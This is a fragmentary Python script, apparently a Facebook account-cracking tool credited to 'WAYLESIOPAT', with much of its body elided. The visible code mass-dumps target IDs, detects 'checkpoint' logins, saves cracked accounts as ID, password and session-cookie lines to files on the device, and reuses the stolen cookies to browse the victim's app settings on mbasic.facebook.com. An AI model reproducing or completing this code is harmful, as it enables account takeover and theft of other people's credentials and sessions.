...
{m}•{k}•{h}•{sir} AUTHOR : BY. WAYLESIOPAT {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	if waylesiopat in ['1']:
		dump_massal()
	elif waylesiopat in ['2']:
		result()
	elif waylesiopat in ['3']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='WAYLE CP'))
				...
				if 'no' in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/WAYLE-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/WAYLE-DUMP')
	except:pass
